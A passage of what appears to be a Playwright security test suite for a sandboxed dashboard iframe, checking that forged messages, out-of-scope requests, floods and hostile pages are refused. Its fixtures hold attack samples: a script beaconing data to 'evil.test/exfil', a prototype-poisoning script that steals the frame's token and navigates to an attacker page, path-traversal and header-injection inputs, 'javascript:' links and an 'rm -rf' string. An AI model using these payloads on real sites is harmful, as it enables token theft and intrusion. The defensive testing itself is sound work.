    page.wait_for_function("() => document.querySelector('iframe.frame-dash') !== window.__first", timeout=2500)   # at once, not at the next heartbeat
    assert page.evaluate("document.querySelectorAll('iframe.frame-dash').length") == 1
    assert page.evaluate("window.__first.isConnected") is False
    dash.wait_title("Home")                                # a new frame, a new token, the page drawn again
    assert first == 1


def test_a_reload_from_the_page_destroys_the_iframe_too(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    page.evaluate("window.__first = document.querySelector('iframe.frame-dash')")
    page.wait_for_timeout(1700)
    dash.frame().evaluate("() => { setTimeout(() => location.reload(), 0); }")
    page.wait_for_function("() => document.querySelector('iframe.frame-dash') !== window.__first", timeout=2500)
    dash.wait_title("Home")


def test_a_hello_from_another_origin_window_or_with_another_token_is_refused_while_the_real_one_is_accepted(dash, page):
    """Before the shim's own hello can arrive (same task), the unspent token is replayed from every wrong place."""
    res = page.evaluate("""() => {
      const before = window.__portCount || 0;
      window.__mk({ gestureGapMs: 0 });
      const f = document.querySelector('iframe.frame-dash');
      const tok = new URL(f.src).searchParams.get('tok');
      const hello = (over, source) => window.dispatchEvent(new MessageEvent('message', { data: { k: 'orch-frame-1', t: 'hello', tok: tok, ...over }, source: source === undefined ? f.contentWindow : source, origin: over.origin || 'null' }));
      const count = () => (window.__portCount || 0) - before;
      const out = {};
      hello({ origin: 'https://evil.test' }); out.origin = count();                                  // not the opaque origin
      hello({}, window); out.self = count();                                                         // not the frame's window
      hello({}, null); out.none = count();                                                           // no window at all
      hello({ tok: 'x'.repeat(30) }); out.token = count();                                           // another token
      hello({ k: 'other' }); out.protocol = count();                                                 // another protocol
      hello({ junk: 'y'.repeat(5000) }); out.big = count();                                          // an oversize message
      hello({}); out.valid = count();                                                                // the right one, once
      hello({}); out.again = count();                                                                // and a replay of it
      return out;
    }""")
    assert res == {"origin": 0, "self": 0, "none": 0, "token": 0, "protocol": 0, "big": 0, "valid": 1, "again": 1}, res


def test_window_messages_other_than_a_valid_hello_are_ignored(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    ports = page.evaluate("window.__portCount")
    tok = page.evaluate("new URL(document.querySelector('iframe.frame-dash').src).searchParams.get('tok')")
    req = {"k": "orch-frame-1", "t": "req", "id": 900, "gen": 1, "intent": "fetch", "method": "GET", "path": "/api/x", "headers": {}}
    send = """(m) => { const f = document.querySelector('iframe.frame-dash');
      window.dispatchEvent(new MessageEvent('message', {data: m.data, source: m.src === 'frame' ? f.contentWindow : m.src === 'self' ? window : null, origin: m.origin})); }"""
    for m in [
        {"data": req, "src": "frame", "origin": "null"},                                  # a request: only hello is a window message
        {"data": {**req, "t": "copy", "id": 1, "text": "x"}, "src": "frame", "origin": "null"},   # not a clipboard ask either
        {"data": {"k": "orch-frame-1", "t": "hello", "tok": tok}, "src": "frame", "origin": "https://evil.test"},   # not the opaque origin
        {"data": {"k": "orch-frame-1", "t": "hello", "tok": tok}, "src": "self", "origin": "null"},                 # not the frame's window
        {"data": {"k": "orch-frame-1", "t": "hello", "tok": tok}, "src": "none", "origin": "null"},                 # no window at all
        {"data": {"k": "orch-frame-1", "t": "hello", "tok": "x" * 30}, "src": "frame", "origin": "null"},          # another token
        {"data": {"k": "orch-frame-1", "t": "hello", "tok": tok}, "src": "frame", "origin": "null"},               # the right token, spent
    ]:
        page.evaluate(send, m)
    page.wait_for_timeout(300)
    assert len(dash.calls()) == n and page.evaluate("window.__portCount") == ports and dash.ev("copy") == []
    assert page.evaluate("document.querySelector('.frame-prompt')") is None
    dash.port_event(**{k: v for k, v in req.items() if k != "k"})                           # the same request on the channel: answered
    page.wait_for_function(f"() => window.__fake.calls.length === {n + 1}")


def test_a_crafted_message_is_refused_by_the_scope_table_before_the_transport(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    hostile = [
        {"id": 11, "path": "/secret", "method": "GET"},                      # a path outside the table
        {"id": 12, "path": "/api/x", "method": "DELETE"},                    # a method the table does not name
        {"id": 13, "path": "/a/../secret", "method": "GET"},                 # traversal
        {"id": 14, "path": "//evil.test/x", "method": "GET"},                # another host
        {"id": 15, "path": "/api/x%2F..%2Fsecret", "method": "GET"},         # encoded slash
        {"id": 16, "path": "https://example.com/", "method": "GET"},         # an address, not a path
        {"id": 17, "path": "/api/x", "method": "TRACE"},                     # a method nobody uses
        {"id": 18, "path": "/new", "method": "GET"},                         # right path, wrong method
        {"id": 19, "path": "/api/x\r\nCookie: a=b", "method": "GET"},        # header injection in the path
    ]
    for h in hostile:
        dash.port_event(t="req", gen=1, intent="fetch", headers={}, **h)
    dash.port_event(t="sopen", id=30, gen=1, path="/api/x")                  # a stream on a path with no stream rule
    dash.port_event(t="req", id=32, gen=1, intent="asset", method="GET", path="/secret", headers={})   # an asset is no way round the table
    dash.port_event(t="req", id=31, gen=1, intent="fetch", method="POST", path="/new", headers={"cookie": "a=b", "origin": "x", "host": "y", "content-type": "text/plain"}, body=None)
    page.wait_for_timeout(300)
    after = dash.calls()[n:]
    assert [c["path"] for c in after] == ["/new"]                            # only the one in scope reached the transport...
    assert page.evaluate("window.__fake.calls.at(-1).headers") == {"content-type": "text/plain"}   # ...with only allow-listed headers


def test_a_message_flood_is_capped_and_then_the_frame_is_rebuilt(dash, page):
    dash.open({"rate": 20, "floodSeconds": 2})
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    page.evaluate("window.__first = document.querySelector('iframe.frame-dash')")
    page.evaluate("""() => { for (let i = 0; i < 300; i++) window.__port.dispatchEvent(new MessageEvent('message', {data: {t: 'req', id: 1000 + i, gen: 1, intent: 'fetch', method: 'GET', path: '/api/x', headers: {}}})); }""")
    page.wait_for_timeout(100)
    assert len(dash.calls()) - n <= 20                                      # the cap, not 300
    page.wait_for_timeout(1100)
    page.evaluate("""() => { for (let i = 0; i < 300; i++) window.__port.dispatchEvent(new MessageEvent('message', {data: {t: 'req', id: 2000 + i, gen: 1, intent: 'fetch', method: 'GET', path: '/api/x', headers: {}}})); }""")
    page.wait_for_function("() => document.querySelector('iframe.frame-dash') !== window.__first")   # sustained: destroyed and rebuilt


def test_in_flight_requests_are_capped_per_frame(dash, page):
    dash.open({"inflight": 3})
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    for i in range(10):                                                      # /slow is held at the host: they pile up
        dash.port_event(t="req", id=500 + i, gen=1, intent="fetch", method="GET", path="/slow", headers={})
    page.wait_for_timeout(300)
    assert len(dash.calls()) - n == 2          # the cap is 3 and the page's own stream holds one
    page.evaluate("window.__release('/slow')")


def test_a_body_over_the_cap_is_refused(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    page.evaluate("""() => window.__port.dispatchEvent(new MessageEvent('message', {data: {t: 'req', id: 77, gen: 1, intent: 'fetch', method: 'POST', path: '/new', headers: {}, body: new ArrayBuffer(2 * 1024 * 1024)}}))""")
    page.wait_for_timeout(200)
    assert len(dash.calls()) == n


def test_a_request_to_a_route_outside_the_scope_table_fails_in_the_page_and_never_reaches_the_transport(dash):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    res = f.evaluate("""async () => {
      const out = {};
      out.secret = await fetch('/secret').then(() => 'ok', (e) => e.message);
      out.put = await fetch('/api/x', {method: 'PUT', body: 'x'}).then(() => 'ok', (e) => e.message);
      out.xhr = await new Promise((r) => { const x = new XMLHttpRequest(); x.open('GET', '/secret'); x.onerror = () => r('error'); x.onload = () => r('load'); x.send(); });
      out.cross = await fetch('https://example.com/').then(() => 'ok', (e) => e.message);
      return out;
    }""")
    assert res["secret"].startswith("refused") and res["put"].startswith("refused") and res["xhr"] == "error"
    assert "blocked" in res["cross"]
    assert dash.calls()[n:] == []


# ---- hostile page content: the page is changed as a DOM and moved in, never serialised and parsed again -------------

def test_a_hostile_page_string_runs_nothing_and_leaves_no_handler_or_script_url(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    page.evaluate("window.__first = document.querySelector('iframe.frame-dash')")
    dash.click("#mx")
    dash.wait_title("mx")
    page.wait_for_timeout(600)
    f = dash.frame()
    left = f.evaluate("""() => {
      const walk = (root, out) => { root.querySelectorAll('*').forEach((n) => { out.push(n); if (n.localName === 'template' && n.content) walk(n.content, out); }); return out; };
      const all = walk(document, []);
      const bad = [];
      for (const n of all) for (const a of n.attributes) {
        const v = a.value.replace(/[\u0000-\u0020]/g, '').toLowerCase();
        if (/^on/i.test(a.name) || a.name === 'srcdoc' || a.name === 'nonce' || v.startsWith('javascript:') || v.startsWith('data:text/html')) bad.push(n.localName + '@' + a.name);
      }
      return { x: window.__x || 0, bad, scripts: all.filter((n) => n.localName === 'script').length,
        base: document.querySelectorAll('base, meta[http-equiv], object, embed, iframe, noscript').length,
        links: [...document.querySelectorAll('link')].map((l) => l.rel), path: location.pathname, title: document.title };
    }""")
    assert left["x"] == 0 and left["bad"] == [] and left["scripts"] == 0 and left["base"] == 0, left
    assert left["links"] == [] and left["path"] == "/sandbox/dash"            # no refresh, no navigation
    assert not [m for m in dash.ev("log") if m.startswith("frame rebuilt")]   # nothing made the app rebuild the frame
    assert not [c for c in dash.calls() if c["path"] in ("/secret", "/healthz")]
    # a script: link in the page that survived in any form is neutralised when clicked
    f.evaluate("() => { const a = document.createElement('a'); a.id = 'late'; a.setAttribute('href', 'javascript:window.__x=1'); document.body.appendChild(a); a.click(); }")
    page.wait_for_timeout(200)
    assert f.evaluate("window.__x || 0") == 0


# ---- the clipboard: the frame asks, the person clicks in the app ------------------------------------------------------

def test_the_frame_cannot_write_the_clipboard_without_a_click_in_the_app(dash, page):
    dash.open({"promptDelayMs": 400, "promptGapMs": 1500})
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    before = f.evaluate("(() => { const r = window.frameElement; return null; })()")
    rect0 = page.evaluate("JSON.stringify(document.querySelector('iframe.frame-dash').getBoundingClientRect())")
    f.evaluate("() => { window.__cp = window.orchHost.copy('rm -rf /tmp/x\\u202e\\u200b').then(() => 'copied', () => 'failed'); }")
    page.wait_for_selector(".frame-prompt")
    assert page.evaluate("document.querySelector('.frame-prompt button').disabled") is True    # not clickable at once
    shown = page.inner_text(".frame-prompt pre")
    assert "rm -rf /tmp/x" in shown and "U+202E" in shown and "U+200B" in shown                 # bidi and zero-width characters made visible
    assert page.evaluate("document.querySelectorAll('.frame-prompt pre .hidden-char').length") == 2
    # a fixed box after the frame in the document: the frame does not move
    assert page.evaluate("getComputedStyle(document.querySelector('.frame-prompt')).position") == "fixed"
    assert page.evaluate("JSON.stringify(document.querySelector('iframe.frame-dash').getBoundingClientRect())") == rect0
    assert page.evaluate("document.querySelector('iframe.frame-dash').compareDocumentPosition(document.querySelector('.frame-prompt')) & Node.DOCUMENT_POSITION_FOLLOWING")
    # a script click (not a real one) never counts, even after the delay
    page.wait_for_timeout(600)
    page.evaluate("document.querySelector('.frame-prompt button').click()")
    page.wait_for_timeout(200)
    assert dash.ev("copy") == []
    # a second ask while one is up is refused outright
    assert f.evaluate("window.orchHost.copy('other').then(() => 'copied', () => 'failed')") == "failed"
    page.click(".frame-prompt button:text-is('Dismiss')")
    assert f.evaluate("window.__cp") == "failed" and dash.ev("copy") == []
    assert f.evaluate("window.orchHost.copy('again').then(() => 'copied', () => 'failed')") == "failed"   # inside the gap
    # an ask that is up when the page changes is withdrawn: nothing is copied for a document the app did not just write
    page.wait_for_timeout(1600)
    f.evaluate("() => { window.__cp2 = window.orchHost.copy('late').then(() => 'copied', () => 'failed'); }")
    page.wait_for_selector(".frame-prompt")
    f.evaluate("document.getElementById('board').click()")
    dash.wait_title("Board")
    f = dash.frame()                                       # the page changed: a new frame
    page.wait_for_function("() => !document.querySelector('.frame-prompt')")
    assert dash.ev("copy") == []
    # a real click on Copy, after the delay, writes it, once
    page.wait_for_timeout(1600)
    f.evaluate("() => { window.__cp3 = window.orchHost.copy('ok').then(() => 'copied', () => 'failed'); }")
    page.wait_for_selector(".frame-prompt")
    page.click(".frame-prompt button:text-is('Copy')")
    assert f.evaluate("window.__cp3") == "copied" and dash.ev("copy") == ["ok"]
    # the host has no clipboard read at all, and the frame has no message for one
    src = page.evaluate("fetch('/static/js/frame-host.js').then((r) => r.text())")
    assert "readText" not in src and ".read(" not in src


# ---- who is talking: a spent token, a destroyed frame, odd shapes -------------------------------------------------------

def test_odd_message_shapes_are_dropped_and_a_destroyed_frames_answers_go_nowhere(dash, page):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    # odd shapes: own __proto__ keys, a hostile type, junk, oversize strings and too many keys
    page.evaluate("""() => {
      const odd = [JSON.parse('{"t":"req","__proto__":{"x":1},"id":5,"gen":1,"intent":"fetch","method":"GET","path":"/secret","headers":{}}'),
        {t: 'constructor'}, {t: '__proto__'}, [1, 2], 'text', null, 7, {t: 'x'.repeat(40)}, {t: 'log', m: 'y'.repeat(5000)},
        Object.fromEntries(Array.from({length: 30}, (_, i) => ['k' + i, 1]).concat([['t', 'req']])),
        Object.assign(Object.create({inherited: 1}), {t: 'req', id: 1, gen: 1, intent: 'fetch', method: 'GET', path: '/api/x', headers: {}})];
      for (const d of odd) window.__port.dispatchEvent(new MessageEvent('message', {data: d})); }""")
    page.wait_for_timeout(200)
    assert len(dash.calls()) == n
    # a held request answered after the frame was destroyed and rebuilt is not sent to the new frame
    f.evaluate("() => { fetch('/slow').catch(() => {}); }")
    page.wait_for_function("() => window.__fake.calls.some((c) => c.path === '/slow')")
    page.evaluate("window.__old = document.querySelector('iframe.frame-dash'); window.__oldPort = window.__port")
    page.wait_for_timeout(1700)
    f.evaluate("() => { setTimeout(() => { location.href = location.origin + '/healthz'; }, 0); }")
    page.wait_for_function("() => document.querySelector('iframe.frame-dash') !== window.__old")
    page.evaluate("window.__release('/slow')")
    page.wait_for_timeout(300)
    dash.wait_title("Home")
    assert dash.frame().evaluate("window.__r !== undefined") and page.evaluate("window.__old.isConnected") is False
    assert page.evaluate("window.__port !== window.__oldPort")                     # a new channel for the new frame

# ---- the channel: a navigated document is a stranger -----------------------------------------------------------------

EVIL_BEACON = """<!doctype html><title>evil</title><h1>Sign in to TIX again</h1><img src="https://evil.test/never.png"><script>
const beacon = (d) => { new Image().src = 'https://evil.test/exfil?d=' + encodeURIComponent(d); };
addEventListener('message', (e) => { beacon('got:' + (e.data && e.data.t) + ':' + (e.data && e.data.chunk || '')); });
const tok = location.hash.slice(1), K = 'orch-frame-1';
for (const m of [{k: K, t: 'hello', tok}, {k: K, t: 'write'}, {k: K, t: 'pong', n: 1},
                 {k: K, t: 'req', id: 99, gen: 1, intent: 'fetch', method: 'GET', path: '/api/forged', headers: {}}]) parent.postMessage(m, '*');
setInterval(() => parent.postMessage({k: K, t: 'req', id: 100, gen: 1, intent: 'fetch', method: 'GET', path: '/api/forged', headers: {}}, '*'), 100);
</script>"""

# a page script that poisons the realm (the shim captured what it needs before any page script exists), steals
# anything that looks like a port or a secret, reads the frame's own address (the one-time token is in it), then
# navigates the frame to a foreign page that never finishes loading
STEAL_JS = """(() => {
  window.__stolen = []; window.__ports = 0;
  const look = (x) => { try { if (x instanceof MessagePort) window.__ports++; if (typeof x === 'string' && /^[0-9a-f]{48}$/.test(x)) window.__stolen.push(x); } catch (e) {} };
  const lookAll = (a) => { for (const x of a) { look(x); try { if (x && typeof x === 'object') for (const k of Object.keys(x).slice(0, 20)) look(x[k]); } catch (e) {} } };
  const rapply = Reflect.apply;
  const wrap = (obj, name) => { const o = obj[name]; try { obj[name] = function (...a) { look(this); lookAll(a); return rapply(o, this, a); }; } catch (e) {} };
  for (const n of ['call', 'apply', 'bind']) wrap(Function.prototype, n);
  for (const n of ['assign', 'defineProperty', 'getOwnPropertyDescriptor', 'freeze', 'keys', 'entries']) wrap(Object, n);
  for (const n of ['push', 'map', 'forEach', 'filter', 'concat', 'slice', 'includes']) wrap(Array.prototype, n);
  for (const n of ['get', 'set', 'has', 'delete']) wrap(Map.prototype, n);
  wrap(JSON, 'stringify'); wrap(Promise.prototype, 'then'); wrap(MessagePort.prototype, 'postMessage'); wrap(Reflect, 'apply');
  for (const k of ['data', 'ports', 'source', 'origin', 'target', 'currentTarget']) {
    const d = Object.getOwnPropertyDescriptor(MessageEvent.prototype, k) || Object.getOwnPropertyDescriptor(Event.prototype, k);
    if (d && d.get) Object.defineProperty(MessageEvent.prototype, k, { configurable: true, get() { look(this.target); look(this.currentTarget); return d.get.call(this); } });
  }
  const od = Object.getOwnPropertyDescriptor(MessagePort.prototype, 'onmessage');
  if (od) Object.defineProperty(MessagePort.prototype, 'onmessage', { configurable: true, get: od.get, set(f) { look(this); return od.set.call(this, f); } });
  Object.defineProperty(Object.prototype, 'sid', { configurable: true, get() { return undefined; }, set(v) { window.__stolen.push(v); } });
  const tok = new URL(location.href).searchParams.get('tok');
  fetch('/api/x').then((r) => r.text()).then(() => { window.__fetched = 1; });
  window.__go = () => { location.href = 'https://evil.test/steal#' + tok; };
  setTimeout(() => { if (window.__auto) window.__go(); }, 300);
})();"""


def _add_routes(page, extra_routes, scopes=()):
    page.evaluate("""([r, s]) => { Object.assign(window.__site.routes, r); window.__site.scopes.rules.push(...s.map((p) => ({methods: ['GET'], pattern: p}))); }""",
                  [extra_routes, list(scopes)])


def test_a_foreign_document_in_the_frame_gets_nothing_and_cannot_speak_as_the_frame(dash, page):
    """The reviewer's probes (an SVG link, a captured session, a stream that kept sending): the frame is navigated to a
    foreign page that never finishes loading. It has no port, so it hears nothing and says nothing the host accepts, and the
    heartbeat rebuilds the iframe even though that document's load event never fires."""
    hits = []

    def evil(route):
        url = route.request.url
        hits.append(url)
        if "never.png" in url:
            return                                            # never answered: that document's load event never fires
        route.fulfill(status=200, content_type="text/html", body=EVIL_BEACON if "/steal" in url else "")
    page.route("https://evil.test/**", evil)
    _add_routes(page, {"/steal-page": {"body": f'<!doctype html><h1 id="h">steal</h1><script src="/static/steal.js?v={v(STEAL_JS)}"></script>', "headers": {"content-type": "text/html"}, "page": True},
                       "/static/steal.js": {"body": STEAL_JS, "headers": {"content-type": "text/javascript"}}}, ["/steal-page"])
    dash.open({"pingMs": 700})
    page.evaluate("window.__first = document.querySelector('iframe.frame-dash')")
    page.evaluate("window.__host.go('/steal-page')")
    dash.wait_title("steal")
    f = dash.frame()
    f.wait_for_function("() => window.__fetched === 1")
    page.wait_for_timeout(500)
    # the poisoned realm saw no port and no secret while the shim worked (a fetch, a page, a stream, a copy ask)
    f.evaluate("() => { new EventSource('/events'); window.orchHost.copy('x').catch(() => {}); }")
    page.wait_for_selector(".frame-prompt")
    page.click(".frame-prompt button:text-is('Dismiss')")
    stolen = f.evaluate("({ports: window.__ports, secrets: window.__stolen})")
    assert stolen == {"ports": 0, "secrets": []}, stolen
    page.wait_for_function("() => window.__fake.streams.some((s) => !s.closed)")
    # now the page navigates the frame away, with the one-time token it read from the frame's address
    f.evaluate("window.__go()")
    page.wait_for_function("() => document.querySelector('iframe.frame-dash') !== window.__first", timeout=8000)
    page.evaluate("window.__fake.streams.forEach((s) => s.push('data: LIVE-EVENT\\n\\n'))")
    page.evaluate("window.__fake.calls.length")
    page.wait_for_timeout(1500)
    assert not [h for h in hits if "exfil" in h and "got:" in h], hits                       # nothing was ever delivered to it
    assert not [c for c in dash.calls() if c["path"] == "/api/forged"]                        # nothing it said was accepted
    assert page.evaluate("window.__first.isConnected") is False
    dash.wait_title("steal")                                   # the new frame opens the page the app last knew


FOREIGN = """<!doctype html><title>foreign</title><img src="https://evil.test/never.png"><script>
window.__got = []; addEventListener('message', (e) => { window.__got.push(String(e.data && (e.data.t || JSON.stringify(e.data)))); });
</script>"""


def test_a_foreign_document_listening_on_window_receives_nothing_while_the_host_keeps_sending(dash, page):
    """The host must never post to the frame's window after hello (mutation: a window postMessage beside the port post)."""
    page.route("https://evil.test/**", lambda r: None if "never.png" in r.request.url else r.fulfill(status=200, content_type="text/html", body=FOREIGN))
    dash.open({"pingMs": 60000})
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    page.wait_for_function("() => window.__fake.streams.some((s) => !s.closed)")
    f.evaluate("() => { fetch('/slow').catch(() => {}); }")                                  # an in-flight request, answered later
    page.wait_for_function("() => window.__fake.calls.some((c) => c.path === '/slow')")
    f.evaluate("() => { setTimeout(() => { location.href = 'https://evil.test/foreign'; }, 0); }")
    page.wait_for_function("() => [...document.querySelectorAll('iframe.frame-dash')].length === 1")
    for _ in range(100):
        ev = [fr for fr in page.frames if "evil.test/foreign" in fr.url]
        if ev:
            break
        page.wait_for_timeout(50)
    assert ev, "the foreign document never arrived"
    page.evaluate("window.__fake.streams.forEach((s) => s.push('data: LIVE\\n\\n'))")
    page.evaluate("window.__release('/slow')")
    page.evaluate("window.__host.go('/board')")                                               # and an app-started page
    page.evaluate("window.__host.send({t: 'ping', n: 1})")
    page.wait_for_timeout(700)
    assert ev[0].evaluate("window.__got") == []


POLLUTE_JS = """(() => {
  window.__seen = { ports: 0, control: [] };
  const look = (x) => { try { if (x instanceof MessagePort) window.__seen.ports++; if (x && typeof x === 'object' && ['ping', 'go', 'copied', 'write'].includes(x.t)) window.__seen.control.push(x.t); } catch (e) {} };
  const each = Array.prototype.forEach;
  const hook = (o, n) => { const f = o[n]; o[n] = function (...a) { look(this); Reflect.apply(each, a, [look]); return Reflect.apply(f, this, a); }; };
  for (const n of ['get', 'set', 'delete', 'has']) hook(Map.prototype, n);
  for (const n of ['push', 'slice', 'map', 'forEach', 'concat', 'includes', 'indexOf']) hook(Array.prototype, n);
  for (const n of ['then', 'catch', 'finally']) hook(Promise.prototype, n);
  for (const n of ['resolve', 'reject', 'all']) hook(Promise, n);
  const g = Object.getOwnPropertyDescriptor(MessageEvent.prototype, 'data');
  Object.defineProperty(MessageEvent.prototype, 'data', { configurable: true, get() { look(this.target); return g.get.call(this); } });
  fetch('/api/x').then(() => { window.__done = 1; });
  new EventSource('/events');
})();"""


def test_a_page_that_replaces_map_promise_and_array_methods_gets_neither_the_port_nor_a_control_message(dash, page):
    _add_routes(page, {"/poll": {"body": f'<!doctype html><h1 id="h">poll</h1><script src="/static/poll.js?v={v(POLLUTE_JS)}"></script>', "headers": {"content-type": "text/html"}, "page": True},
                       "/static/poll.js": {"body": POLLUTE_JS, "headers": {"content-type": "text/javascript"}}}, ["/poll"])
    dash.open({"pingMs": 200})
    page.evaluate("window.__host.go('/poll')")
    dash.wait_title("poll")
    f = dash.frame()
    f.wait_for_function("() => window.__done === 1")
    page.wait_for_function("() => window.__fake.streams.some((s) => !s.closed)")
    page.evaluate("window.__fake.streams.forEach((s) => s.push('data: x\\n\\n'))")
    f.evaluate("() => { window.orchHost.copy('t').catch(() => {}); }")
    page.wait_for_selector(".frame-prompt")
    page.click(".frame-prompt button:text-is('Dismiss')")
    page.wait_for_timeout(1000)                                                          # several heartbeats
    assert f.evaluate("window.__seen") == {"ports": 0, "control": []}


def test_the_heartbeat_rebuilds_a_frame_that_stops_answering(dash, page):
    dash.open({"pingMs": 250})
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    page.evaluate("window.__first = document.querySelector('iframe.frame-dash')")
    page.evaluate("window.__port.close()")                 # nothing reaches the shim any more, so no ping is answered
    page.wait_for_function("() => document.querySelector('iframe.frame-dash') !== window.__first", timeout=6000)
    assert "frame rebuilt: no pong" in dash.ev("log")
    dash.wait_title("Home")


def test_an_svg_anchor_is_intercepted_like_any_link_and_its_foreign_address_is_dropped(dash, page):
    hits = []
    page.route("https://evil.test/**", lambda route: (hits.append(route.request.url), route.fulfill(status=200, content_type="text/html", body="evil")))
    dash.open()
    page.evaluate("window.__first = document.querySelector('iframe.frame-dash')")
    page.evaluate("window.__host.go('/svg')")
    dash.wait_title("svg")
    f = dash.frame()
    state = f.evaluate("""() => ({
      ext: document.getElementById('ext').getAttribute('xlink:href'), same: document.getElementById('same').getAttribute('xlink:href'),
      smil: document.querySelectorAll('animate, set, animateMotion, animateTransform').length, use: document.getElementById('u').getAttribute('href'),
      rels: [...document.querySelectorAll('link')].map((l) => l.rel), ping: document.getElementById('pinga').getAttribute('ping') })""")
    assert state["ext"] is None and state["use"] is None and state["smil"] == 0 and state["ping"] is None   # foreign addresses and SMIL are gone
    assert state["same"] == "/board" and state["rels"] == []                                               # an own-origin SVG link stays; links are an allow-list
    f.locator("#r2").click(force=True)                                                                   # the foreign one: nothing happens
    f.locator("#r3").click(force=True)                                                                   # the animated one: nothing happens
    page.wait_for_timeout(800)
    assert not [m for m in dash.ev("log") if m.startswith("frame rebuilt")] and not hits
    f.locator("#r1").click()                                                                             # an SVG anchor is handled by the shim, not the browser
    dash.wait_title("Board")
    assert not [m for m in dash.ev("log") if m.startswith("frame rebuilt")]                               # (a native navigation would have rebuilt the frame)


# ---- scripts: only the dashboard's own static JavaScript runs -------------------------------------------------------------

def test_only_javascript_under_the_static_prefix_runs_whatever_pin_the_page_writes(dash, page):
    dash.open()
    page.evaluate("window.__host.go('/scripts')")
    dash.wait_title("scripts")
    page.wait_for_timeout(600)
    ran = dash.frame().evaluate("({ok: window.__s_ok || 0, plain: window.__s_plain || 0, html: window.__s_html || 0, art: window.__s_art || 0, api: window.__s_api || 0})")
    assert ran == {"ok": 1, "plain": 0, "html": 0, "art": 0, "api": 0}, ran                             # a JS type under /static/ only
    log = dash.ev("log")
    assert any("(type)" in m and "b-plain.js" in m for m in log) and any("(path)" in m and "d-art.js" in m for m in log)
    assert not [c for c in dash.calls() if c["path"].startswith(("/a/L-1/d-art", "/api/e-api"))]       # the path rule stops them before any request


# ---- gestures: the frame cannot open, download or walk the history on its own ---------------------------------------------

def test_open_download_and_history_need_a_user_gesture_and_stay_inside_what_the_frame_pushed(dash, page):
    dash.open({"gestureGapMs": 300})
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    dash.activate(False)
    n = len(dash.calls())
    open_ = {"t": "open", "path": "/t/L-1/x"}
    dash.port_event(**open_)                                         # no gesture: nothing is fetched, nothing is opened
    dash.port_event(t="download", path="/a/L-1/data.csv")
    dash.port_event(t="open", href="https://example.com/")
    dash.port_event(t="hist", op="go", n=-50)
    dash.port_event(t="hist", op="back")
    dash.port_event(t="hist", op="push", path="/board")             # no gesture: no new history entry, it replaces
    page.wait_for_timeout(300)
    assert dash.ev("history") == [{"op": "replace", "path": "/board"}]
    assert len(dash.calls()) == n and dash.ev("viewer") == [] and dash.ev("download") == [] and dash.ev("external") == []
    assert [h for h in dash.ev("history") if h["op"] in ("back", "go", "forward")] == []
    assert page.evaluate("document.querySelector('.frame-prompt')") is None
    dash.activate()                                                  # a gesture: one gated action
    dash.port_event(**open_)
    page.wait_for_function("() => window.__ev.viewer.length === 1")
    dash.port_event(t="download", path="/a/L-1/data.csv")            # a second one inside the gap: refused
    page.wait_for_timeout(300)
    assert page.evaluate("document.querySelector('.frame-prompt')") is None
    # a download needs the person's click on the question, with the name shown
    page.wait_for_timeout(300)
    dash.activate()
    dash.port_event(t="download", path="/a/L-1/data.csv")
    page.wait_for_selector(".frame-prompt")
    assert "d.csv" in page.inner_text(".frame-prompt pre") and dash.ev("download") == []
    page.click(".frame-prompt button:text-is('Download')")
    page.wait_for_function("() => window.__ev.download.length === 1")
    # an out-of-scope path is refused even with a gesture (the scope table covers open and download too)
    page.wait_for_timeout(400)
    dash.activate()
    m = len(dash.calls())
    dash.port_event(t="download", path="/secret")
    dash.port_event(t="open", path="/secret")
    page.wait_for_timeout(300)
    assert [c["path"] for c in dash.calls()[m:]] == []
    # history: only back over entries the frame pushed
    page.wait_for_timeout(400)
    dash.activate()
    dash.port_event(t="hist", op="back")
    page.wait_for_timeout(200)
    assert [h for h in dash.ev("history") if h["op"] == "back"] == []                    # nothing was pushed: nothing to go back over
    dash.port_event(t="hist", op="push", path="/board")
    page.wait_for_timeout(400)
    dash.activate()
    dash.port_event(t="hist", op="go", n=-5)
    dash.port_event(t="hist", op="back")
    page.wait_for_function("() => window.__ev.history.some((h) => h.op === 'back')")
    assert not [h for h in dash.ev("history") if h["op"] == "go"]


def test_a_gesture_alone_does_not_open_an_outside_address_the_person_confirms_it(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    dash.activate()
    dash.port_event(t="open", href="https://example.com/a\u202eb")
    page.wait_for_selector(".frame-prompt")
    assert "%E2%80%AE" in page.inner_text(".frame-prompt pre") and dash.ev("external") == []     # shown in its escaped form: the raw character never appears
    page.evaluate("document.querySelector('.frame-prompt button').click()")                      # a script click does not count
    page.wait_for_timeout(300)
    assert dash.ev("external") == []
    page.click(".frame-prompt button:text-is('Open')")
    page.wait_for_function("() => window.__ev.external.length === 1")
    dash.activate()
    dash.port_event(t="open", href="javascript:alert(1)")
    dash.port_event(t="open", href="ftp://example.com/")
    page.wait_for_timeout(200)
    assert page.evaluate("document.querySelector('.frame-prompt')") is None


def test_a_redirect_that_ends_outside_the_scope_table_is_refused_and_a_stream_cap_holds(dash, page):
    dash.open({"streams": 3})
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    got = f.evaluate("fetch('/redir').then(() => 'ok', (e) => e.message)")
    assert got.startswith("refused")                                                            # /redir answered from /secret
    for i in range(6):
        dash.port_event(t="sopen", id=800 + i, gen=1, path="/events")
    page.wait_for_timeout(300)
